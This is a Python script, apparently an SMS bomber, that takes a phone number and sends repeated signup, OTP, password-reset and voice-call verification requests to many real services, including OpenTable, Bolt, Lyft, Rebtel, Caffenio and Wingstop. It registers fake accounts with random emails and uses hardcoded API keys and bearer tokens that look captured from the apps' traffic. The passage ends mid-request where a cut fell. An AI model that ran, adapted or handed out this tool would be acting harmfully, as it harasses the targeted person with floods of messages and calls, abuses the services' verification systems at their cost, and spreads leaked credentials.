#!/usr/bin/env python3
# pip install requests
import requests, random, string, uuid, sys

# Recibe el número del argumento
if len(sys.argv) < 2:
    print("❌ Falta el número de teléfono.")
    exit()

USER = sys.argv[1]  # <-- número recibido del bot

print(f"📱 Enviando SMS a {USER}...")


URL = "https://mobile-api.opentable.com/api/v1/2fa/start"
AUTH = "64279d8c-de84-418e-9ccd-6057b4a83fc0"

headers = {
    "Accept": "application/json",
    "User-Agent": "com.opentable/17.13.0; android; android/9; 1.5/1280x720; d693dd23-6539-401b-94cd-0c8aa005c992/Anonymous",
    "Accept-Language": "es-MX;q=1.0,es;q=0.7,*;q=0.3",
    "OT-Force-Experiment": "android_delivery=1,mobile_rest:sms_opt_in_statuses=1,mobile_rest:access_rules_v2=1,android_inline_experiences_v2=1,mobile_rest:deposit_allowed=1,mobile_rest:enableAvailabilityBlocks=1,android_showTermsAndConditions=1,mobile_rest:force_inline_payment_environment=0,android_enableDinerProfilePhoto=1,mobile_rest:experienceVariablePricing=0",
    "Authorization": f"bearer {AUTH}",
    "Content-Type": "application/json; charset=UTF-8",
}

data = {"phone": {"countryCode": "52", "countryId": "MX", "number": USER}, "target": "VOICE"}

r = requests.post(URL, headers=headers, json=data, timeout=15)
print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


URL = "https://api.prontoapp.tech/auth/rider/signup"

def rand_username(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def rand_name():
    return random.choice(["juan","miguel","lucas","santiago","carlos","ana","maría"]) + " " + \
           random.choice(["perez","gomez","lopez","ruiz","diaz","ramirez"])

payload = {
    "country_code": "+52",
    "device_id": uuid.uuid4().hex,         # cambia cada vez
    "device_type": 1,
    "email": f"{rand_username(10)}@vaupk.org",   # parte aleatoria
    "latitude": 0.0,
    "longitude": 0.0,
    "name": rand_name(),
    "password": "jajajer367@qianhost.com",
    "phone": USER,
    "picture": "",
    "referrer_code": ""
}

headers = {
    "Host": "api.prontoapp.tech",
    "content-type": "application/json; charset=UTF-8",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/5.0.0-alpha.3"
}

r = requests.post(URL, headers=headers, json=payload, timeout=15)

# Solo imprime status code y cookies (como dict)
print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


URL = "https://api.prontoapp.tech/communication/verification-codes/send"

payload = {
    "email_or_phone": USER,
    "method": "phone",
    "use_case": "reset_password",
    "user_type": "rider"
}

headers = {
    "content-type": "application/json; charset=UTF-8",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/5.0.0-alpha.3"
}

r = requests.post(URL, headers=headers, json=payload, timeout=15)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


URL = "https://node.bolt.eu/driver-registration-portal/driverRegistration/startRegistration"

# generar email aleatorio
rand_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

data = {
    "email": rand_email,
    "phone": f"+52{USER}",
    "city_id": "707",
    "terms_consent_accepted": "1",
    "app_version": "HP.1.1672"
}

headers = {
    "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-N975F Build/PI; wv) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36",
    "accept": "*/*",
    "origin": "https://bolt.eu",
    "x-requested-with": "ee.mtakso.driver",
    "referer": "https://bolt.eu/",
    "accept-encoding": "gzip, deflate",
    "accept-language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
}

r = requests.post(URL, headers=headers, files=data, timeout=15)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)



BOUND = "----WebKitFormBoundary4sWH553XCgIxBBV5"

# === 1️⃣ Generar email aleatorio ===
EMAIL = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@outlook.com"

# === 2️⃣ Primer POST: startRegistration ===
body = (
    f"--{BOUND}\r\n"
    f'Content-Disposition: form-data; name="email"\r\n\r\n{EMAIL}\r\n'
    f"--{BOUND}\r\n"
    f'Content-Disposition: form-data; name="phone"\r\n\r\n+52{USER}\r\n'
    f"--{BOUND}\r\n"
    f'Content-Disposition: form-data; name="city_id"\r\n\r\n707\r\n'
    f"--{BOUND}\r\n"
    f'Content-Disposition: form-data; name="terms_consent_accepted"\r\n\r\n1\r\n'
    f"--{BOUND}\r\n"
    f'Content-Disposition: form-data; name="app_version"\r\n\r\nHP.1.1672\r\n'
    f"--{BOUND}--\r\n"
)

headers1 = {
    "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-N975F Build/PI; wv) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36",
    "accept": "*/*",
    "origin": "https://bolt.eu",
    "x-requested-with": "ee.mtakso.driver",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://bolt.eu/",
    "accept-language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": f"multipart/form-data; boundary={BOUND}"
}

r1 = requests.post(
    "https://node.bolt.eu/driver-registration-portal/driverRegistration/startRegistration",
    headers=headers1,
    data=body.encode(),
    timeout=15
)

data1 = r1.json()
token = data1.get("data", {}).get("token")

if not token:
    print("Error: no se obtuvo token")
    print(r1.status_code, r1.text)
    exit()

# === 3️⃣ Segundo POST: startVerification ===
payload2 = {
    "token": token,
    "verification_code_channel": "sms",
    "device_os_version": "9",
    "device_name": "Samsung SM-N975F",
    "deviceId": ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)),
    "device_type": "android",
    "version": "DR.2.26",
    "language": "es-es",
    "visitor_id": "visitor-driver-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
}

headers2 = {
    "Host": "driverregistration.live.boltsvc.net",
    "accept": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-N975F Build/PI; wv) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
                  "Chrome/118.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "origin": "https://signup.bolt.eu",
    "x-requested-with": "ee.mtakso.driver",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://signup.bolt.eu/",
    "accept-language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
}

r2 = requests.post(
    "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification",
    headers=headers2,
    json=payload2,
    timeout=15
)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)



url = "https://mobile-api.opentable.com/api/v1/2fa/start"
payload = {
    "phone": {
        "countryCode": "52",
        "countryId": "MX",
        "number": USER
    },
    "target": "SMS"
}

headers = {
    "Accept": "application/json",
    "User-Agent": "com.opentable/17.1.0; android; android/9; 1.5/1280x720; e7a6e9cd-1cc2-4b86-9fbc-1ddf999649d3/Anonymous",
    "Accept-Language": "es-MX;q=1.0,es;q=0.7,*;q=0.3",
    "OT-Force-Experiment": "android_delivery=1,mobile_rest:sms_opt_in_statuses=1,mobile_rest:access_rules_v2=1,"
                           "android_inline_experiences_v2=1,mobile_rest:deposit_allowed=1,android_showTermsAndConditions=1,"
                           "mobile_rest:force_inline_payment_environment=0,android_enableDinerProfilePhoto=1",
    "Authorization": "bearer e24f13e8-1f38-47c1-ae4d-f2d6baa6bf20",
    "Content-Type": "application/json; charset=UTF-8",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}

r = requests.post(url, headers=headers, json=payload, timeout=15)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


url = "https://endpointtekaeloginprod-vwfavopelq-uc.a.run.app/user/sendVerificationSMS"
payload = {"telefono": USER}

headers = {
    "user-agent": "Dart/2.15 (dart:io)",
    "content-type": "application/json; charset=UTF-8",
    "accept-encoding": "gzip",
    "authorization": "Bearer"
}

r = requests.post(url, headers=headers, json=payload, timeout=15)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://api.empowerapp.mx/access/register"
payload = {
    "phone_number": f"+52{USER}",
    "device_identifier": "20adeca2f6c5d2e7",
    "device_type": 1,
    "apps_flyer_device_id": "1698527586137-8454348626841023331",
    "firebase_instance_id": "acdfdb4e58170140d75af67c3352041b"
}

headers = {
    "Host": "api.empowerapp.mx",
    "x-api-key": "4PO8au2IkC4b7jLLyB3scxcg0Qi76RgL1M0P09qfQyrnNYYnte",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/4.11.0",
    "x-firebase-instance-id": "acdfdb4e58170140d75af67c3352041b",
    "accept-language": "es_ES"
}

r = requests.post(url, headers=headers, json=payload, timeout=15)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor



url = "https://api.empowerapp.mx/access/request"
payload = {
    "phone_number": f"+52{USER}",
    "device_identifier": "20adeca2f6c5d2e7"
}

headers = {
    "Host": "api.empowerapp.mx",
    "x-api-key": "4PO8au2IkC4b7jLLyB3scxcg0Qi76RgL1M0P09qfQyrnNYYnte",
    "content-type": "application/json; charset=utf-8",
    "accept-encoding": "gzip",
    "user-agent": "okhttp/4.11.0",
    "x-firebase-instance-id": "acdfdb4e58170140d75af67c3352041b",
    "accept-language": "es_ES"
}

r = requests.post(url, headers=headers, json=payload, timeout=15)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


URL = "https://cms.wingstopmexico.com/rest/V1/create/customers"

def rand_email():
    u = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{u}@gmail.com"

payload = {
    "customer": {
        "email": rand_email(),
        "firstname": "JUAN",
        "lastname": "PEREZ",
        "addresses": [{"telephone": f"+52{USER}"}]
    },
    "password": "Gearsofwar3@"
}

headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "es-ES,es;q=0.9,ru;q=0.8",
    "Connection": "keep-alive",
    "Origin": "https://wingstop.com.mx",
    "Referer": "https://wingstop.com.mx/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "authorization": "Bearer o6clxh5c4uj4hsw9a6hfb2tysu22pi39",
    "content-type": "application/json",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

r = requests.post(URL, headers=headers, json=payload, timeout=15)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor



r = requests.post(
    "https://mobileservice.caffenio.com/nspv/v2/AffiliationElectronic/PreRegister",
    json={
        "AceptoRecibirComunicados": True,
        "AceptoTerminosYCondiciones": True,
        "Celular": USER,
        "CodigoRecomendados": "",
        "Contrasena": "sdfsdfs@dsfsd.com",
        "Correo": "sdfsdfs@dsfsd.com",
        "LadaId": 1,
        "Nombres": "juan",
        "TipoRegistroId": 1
    },
    headers={
        "Host": "mobileservice.caffenio.com",
        "apprelease": "2",
        "ostype": "android",
        "osversion": "9",
        "appversion": "1.12.2",
        "content-type": "application/json; charset=UTF-8",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.12.12"
    }
)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor



url = "https://userapi.rebtel.com/v2/users"

payload = {
    "id": None,
    "identities": [
        {
            "type": "number",
            "endpoint": f"+52{USER}",
            "verified": False,
            "accessNumber": None
        }
    ],
    "services": None,
    "profile": {
        "name": {"first": None, "last": None, "full": None},
        "contact": {"email": None, "sms": None},
        "localization": {
            "countryId": "MX",
            "locales": ["es-ES"],
            "timezone": "America/Mexico_City"
        },
        "displayCurrencyId": "USD",
        "notification": []
    },
    "ServiceSignupResource": {
        "currencyId": "USD",
        "SignupFor": "calling"
    },
    "InstanceResource": {
        "sessionId": "",
        "deviceId": "",
        "version": {
            "application": "Rebtel SPA",
            "platform": "Win32",
            "os": "Chrome/124",
            "sdk": ""
        },
        "expiresIn": 3600
    },
    "extradata": {
        "hasApp": False,
        "hasBoughtDeal": False,
        "hasLocalNumber": False,
        "hasRebtelCredit": False,
        "hasRecargas": False,
        "inRebtelCountry": False
    },
    "HttpUrlReferral": "https://l.facebook.com/",
    "AffiliateCampaignInformation": None,
    "ExternalId": "542146138",
    "override401": True
}

headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "es",
    "Authorization": "application 7443a5f6-01a7-4ce7-8e87-c36212fad4f5",
    "Connection": "keep-alive",
    "Content-Type": "application/json; charset=UTF-8",
    "Host": "userapi.rebtel.com",
    "Origin": "https://www.rebtel.com",
    "Referer": "https://www.rebtel.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "X-Timestamp": "2024-05-10T17:09:13.597Z",
    "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = f"https://userapi.rebtel.com/v1/users/number/52{USER}/password/forgot"

payload = {
    "option": "sms",
    "template": {
        "id": 226,
        "parameters": {
            "url": "https://my.rebtel.com/password/reset"
        }
    }
}

headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "es",
    "Authorization": "application 7443a5f6-01a7-4ce7-8e87-c36212fad4f5",
    "Connection": "keep-alive",
    "Content-Type": "application/json; charset=UTF-8",
    "Host": "userapi.rebtel.com",
    "Origin": "https://www.rebtel.com",
    "Referer": "https://www.rebtel.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "X-Timestamp": "2024-05-10T17:11:32.274Z",
    "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://api.credito-365.mx/api/users"

payload = {
    "username": USER,
    "user_additional_data": {
        "credolab_reference_number": "3eef88be-55a7-4673-8f50-a670bb8730f0",
        "fingerprint_js": {
            "visitorId": "3eef88be-55a7-4673-8f50-a670bb8730f0",
            "confidence": {
                "score": 0.6,
                "comment": "0.996 if upgrade to Pro: https://fpjs.dev/pro"
            }
        }
    }
}

headers = {
    "accept": "application/json, text/plain, */*",
    "content-type": "application/json",
    "origin": "https://credito-365.mx",
    "referer": "https://credito-365.mx/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
}

r = requests.post(url, json=payload, headers=headers)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)


url = "https://api.credito-365.mx/api/one_time_password/get_password"

payload = {
    "phone_number": USER
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Content-Type": "application/json"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://apiclaroid.claropay.com/pwdless/vpwdl/createUser"

payload = {
    "phoneNumber": f"+52{USER}",
    "bundleVersion": None
}

headers = {
    "Host": "apiclaroid.claropay.com",
    "Content-Type": "application/json",
    "Accept-Charset": "UTF-8",
    "bv": "4.125.100",
    "Connection": "keep-alive",
    "x-api-key": "fm0WOaypPR2m9Nbph55Zk618OSG9je9J7LrzxLbL",
    "Accept": "application/json",
    "User-Agent": "Ktor client",
    "Content-Length": "52",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://apiclaroid.claropay.com/pwdless/vpwdl/oauth2/token/init"

payload = {
    "msisdn": f"+52{USER}",
    "channelDelivery": ""
}

headers = {
    "Host": "apiclaroid.claropay.com",
    "Content-Type": "application/json",
    "Accept-Charset": "UTF-8",
    "bv": "4.125.100",
    "Connection": "keep-alive",
    "x-api-key": "fm0WOaypPR2m9Nbph55Zk618OSG9je9J7LrzxLbL",
    "Accept": "application/json",
    "User-Agent": "Ktor client",
    "Content-Length": "48",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://api.lyft.com/v1/phoneauth"

payload = {
    "phone_number": f"+52{USER}",
    "voice_verification": False,
    "message_format": "sms_android_retriever",
    "client_configuration": "release"
}

headers = {
    "Host": "api.lyft.com",
    "accept": "application/json,application/x-protobuf",
    "x-idl-source": "pb.api.endpoints.v1.phone_auth.CreatePhoneAuthRequest",
    "authorization": "Bearer RGuMBBtm6PNf8wVpRz1yMj/GlVm54aH791OAcZU/xorsg5bPgjjbT29CRWflejx5N3NrazUh4/jUBlFBI8IuioZPk4dhllGb+glXuMTJ/6DYxbmpx764RwE=",
    "x-session": "eyJhIjoiNzA0MjYxYTg3ZTljOWEzOSIsImYiOiJlYTlhZTE4MC0yMTkwLTRjNzAtYmQyOC1kNjA3MmM4ZWYxZTciLCJoIjp0cnVlLCJrIjoiNmUyZTQ0OTgtYzJjNy00MjI3LWI0NzAtNGVmNzU4NmI4ZWNjIn0=",
    "x-client-session-id": "654ce6b6-9c15-470d-90b5-d97ca3036b85",
    "accept-language": "es_ES",
    "user-device": "samsung SM-N975F",
    "x-carrier": "Movistar/Pegaso",
    "x-carrier-b64": "TW92aXN0YXIvUGVnYXNv",
    "user-agent": "lyft:android:9:15.29.3.1697609309",
    "x-locale-language": "es",
    "x-locale-region": "ES",
    "x-device-density": "240",
    "x-design-id": "X",
    "x-location": "31.24916,121.4878983",
    "x-timestamp-ms": "1698465304037",
    "x-timestamp-source": "ntp; age=19420",
    "content-type": "application/json;messageType=pb.api.endpoints.v1.phone_auth.CreatePhoneAuthRequest; charset=utf-8",
    "content-length": "133",
    "accept-encoding": "gzip"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://endpointtekaeloginprod-vwfavopelq-uc.a.run.app/user/sendVerificationSMS"

payload = {
    "telefono": USER
}

headers = {
    "user-agent": "Dart/2.15 (dart:io)",
    "content-type": "application/json; charset=UTF-8",
    "accept-encoding": "gzip",
    "content-length": "25",
    "authorization": "Bearer",
    "host": "endpointtekaeloginprod-vwfavopelq-uc.a.run.app"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


# Generar correo aleatorio
rand2 = random.randint(10, 99)
rand3 = random.randint(100, 999)
rand4 = random.randint(1000, 9999)
email = f"ui{rand2}iii{rand4}i10y.{rand3}o.u@gmail.com"

url = "https://cms.wingstopmexico.com/rest/V1/create/customers"

payload = {
    "customer": {
        "email": email,
        "firstname": "JUAN",
        "lastname": "PEREZ",
        "addresses": [
            {"telephone": f"+52{USER}"}
        ]
    },
    "password": "Gearsofwar3@"
}

headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "es-ES,es;q=0.9,ru;q=0.8",
    "Connection": "keep-alive",
    "Host": "cms.wingstopmexico.com",
    "Origin": "https://wingstop.com.mx",
    "Referer": "https://wingstop.com.mx/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "authorization": "Bearer o6clxh5c4uj4hsw9a6hfb2tysu22pi39",
    "content-type": "application/json",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://legacy.parkimovil.io/m/v1/users/phone-login?lat=19.28556288963067&lng=-98.44728189131308"

payload = {
    "phone": USER,
    "useWhatsapp": 1,
    "areaCode": "52"
}

headers = {
    "Host": "legacy.parkimovil.io",
    "Accept": "application/json",
    "x-token": "",
    "x-country": "mx",
    "x-api-key": "WiZPDQyTr49585pDSrY9p1weQmD4fvSK55251ZVL",
    "x-version": "6.3.249",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "User-Agent": "Parkimovil/6.3.249 CFNetwork/1402.0.8 Darwin/22.2.0",
    "Accept-Encoding": "gzip, deflate, br",
    "x-platform": "ios",
    "Connection": "keep-alive",
    "Content-Type": "application/json"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://legacy.parkimovil.io/m/v1/users/phone-login?lat=19.28556288963067&lng=-98.44728189131308"

payload = {
    "phone": USER,
    "useWhatsapp": 0,
    "areaCode": "52"
}

headers = {
    "Host": "legacy.parkimovil.io",
    "Accept": "application/json",
    "x-token": "",
    "x-country": "mx",
    "x-api-key": "WiZPDQyTr49585pDSrY9p1weQmD4fvSK55251ZVL",
    "x-version": "6.3.249",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "User-Agent": "Parkimovil/6.3.249 CFNetwork/1402.0.8 Darwin/22.2.0",
    "Accept-Encoding": "gzip, deflate, br",
    "x-platform": "ios",
    "Connection": "keep-alive",
    "Content-Type": "application/json"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://legacy.parkimovil.io/m/v1/users"

# Generar correo aleatorio
random_part = str(random.randint(100000, 999999))
email = f"JUAN{random_part}dir@gmail.con"

payload = {
    "lastName": "juan",
    "password": "",
    "useWhatsapp": False,
    "firstName": "perez",
    "phoneAreaCode": "52",
    "username": email,
    "phoneNumber": USER
}

headers = {
    "Host": "legacy.parkimovil.io",
    "Accept": "application/json",
    "x-token": "",
    "x-country": "mx",
    "x-api-key": "WiZPDQyTr49585pDSrY9p1weQmD4fvSK55251ZVL",
    "x-version": "6.3.249",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "User-Agent": "Parkimovil/6.3.249 CFNetwork/1402.0.8 Darwin/22.2.0",
    "Accept-Encoding": "gzip, deflate, br",
    "x-platform": "ios",
    "Connection": "keep-alive",
    "Content-Type": "application/json"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://legacy.parkimovil.io/m/v1/users"

# Generar partes aleatorias del correo
rand1 = random.randint(100, 999)
rand2 = random.randint(1000, 9999)
rand3 = random.randint(10, 99)

email = f"duu{rand1}{rand2}{rand3}dir@gmail.con"

payload = {
    "lastName": "juan",
    "password": "",
    "useWhatsapp": True,
    "firstName": "perez",
    "phoneAreaCode": "52",
    "username": email,
    "phoneNumber": USER
}

headers = {
    "Host": "legacy.parkimovil.io",
    "Accept": "application/json",
    "x-token": "",
    "x-country": "mx",
    "x-api-key": "WiZPDQyTr49585pDSrY9p1weQmD4fvSK55251ZVL",
    "x-version": "6.3.249",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "User-Agent": "Parkimovil/6.3.249 CFNetwork/1402.0.8 Darwin/22.2.0",
    "Accept-Encoding": "gzip, deflate, br",
    "x-platform": "ios",
    "Connection": "keep-alive",
    "Content-Type": "application/json"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://alsea-plugins.ordering.co/alseaplatform/otp_create.php"

payload = {
    "type": "sms",
    "user": USER,
    "country_code": "52"
}

headers = {
    "Content-Type": "application/json;charset=utf-8",
    "Content-Length": "54",
    "Host": "alsea-plugins.ordering.co",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "x-app-x": "android"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor

url = "https://alsea-plugins.ordering.co/alseaplatform/otp_create.php"

payload = {
    "type": "whatsapp",
    "user": USER,
    "country_code": "52"
}

headers = {
    "Content-Type": "application/json;charset=utf-8",
    "Content-Length": "54",
    "Host": "alsea-plugins.ordering.co",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "x-app-x": "android"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


IDeramood = "F2AC0581-F2A1-4D83-98C7-23DDF3911E43"

url = f"https://api.eramood-technology.com/api/eArp/VzESBZLzYqCw?packageId=com.doble.eramood.online&sDiscountableAp=ios&eventLk=eventLk&sLaparotomeAp=iPhone16,2&sSquamateAp=eramood&sSkewAp=18.1.1&CrPkk=CrPkk&sSizedAp=1.0.6&sShovelerAp=F42B9C83-90E7-4B8B-8216-289087B110D3&sTranseptAp=&Crdkk=crdkk&mobilePhone=&sRiffAp=superp-sp&sCegbAp={IDeramood}"

payload = {
    "sHaversineAp": USER,
    "sLaoighisAp": "juyttrr"
}

headers = {
    "Host": "api.eramood-technology.com",
    "User-Agent": "DCApp/1.0.6 (iPhone; iOS 18.1.1; Scale/3.00)",
    "sSquamateAp": "eramood",
    "sDiscountableAp": "ios",
    "sSizedAp": "1.0.6",
    "mobilePhone": "",
    "packageId": "com.doble.eramood.online",
    "CrPkk": "CrPkk",
    "Connection": "keep-alive",
    "sLaparotomeAp": "iPhone16,2",
    "Accept-Language": "es-MX;q=1",
    "sSkewAp": "18.1.1",
    "Crdkk": "crdkk",
    "sTranseptAp": "",
    "eventLk": "eventLk",
    "sShovelerAp": "F42B9C83-90E7-4B8B-8216-289087B110D3",
    "Accept": "*/*",
    "Content-Type": "application/json",
    "sRiffAp": "superp-sp",
    "sCegbAp": IDeramood,
    "Accept-Encoding": "gzip, deflate, br"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


# Generar correo aleatorio
randnum = random.randint(1000, 9999)
email = f"juanper{randnum}@gmail.com"

url = "https://app.andattimomentoespresso.com/nspv/v2/AffiliationElectronic/PreRegister"

payload = {
    "Nombres": "juan",
    "CodigoRecomendados": "",
    "TipoRegistroId": 2,
    "Celular": USER,
    "AceptoRecibirComunicados": True,
    "Contrasena": "Gearsofwar3",
    "Correo": email,
    "AceptoTerminosYCondiciones": True,
    "LadaId": 1
}

headers = {
    "Host": "app.andattimomentoespresso.com",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "Caffenio/42 CFNetwork/1568.200.51 Darwin/24.1.0",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


# Generar correo aleatorio
randnum = random.randint(1000, 9999)
email = f"juanp{randnum}ered@gmail.com"

url = "https://superapp.caffenio.com/nspv/v2/AffiliationElectronic/PreRegister"

payload = {
    "idPais": 1,
    "AceptoTerminosYCondiciones": True,
    "AceptoRecibirComunicados": True,
    "DeviceId": "E2DA85F1-B9F5-425B-8D4F-FCE31CEF40B4",
    "FechaNacimiento": "12-23-2000",
    "CodigoRecomendados": "",
    "Contrasena": "Gearsofwar3@",
    "Celular": USER,
    "Nombres": "juan",
    "TipoRegistroId": 2,
    "LadaId": 1,
    "Apellidos": "persz",
    "Correo": email
}

headers = {
    "Host": "superapp.caffenio.com",
    "Content-Type": "application/json",
    "Accept": "/",
    "Ostype": "ios",
    "Appversion": "2.0.7",
    "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "Caffenio/252 CFNetwork/1568.200.51 Darwin/24.1.0",
    "Language": "es",
    "Apprelease": "4",
    "Osversion": "18.1.1"
}

r = requests.post(url, headers=headers, json=payload)

print(r.status_code)
print(r.cookies.get_dict())
print(r.text)  # <-- muestra el JSON del servidor


url = "https://superapp.caffenio.com/nspv/v1/ChangePassword/Request"

payload = {
    "LadaId": 1,
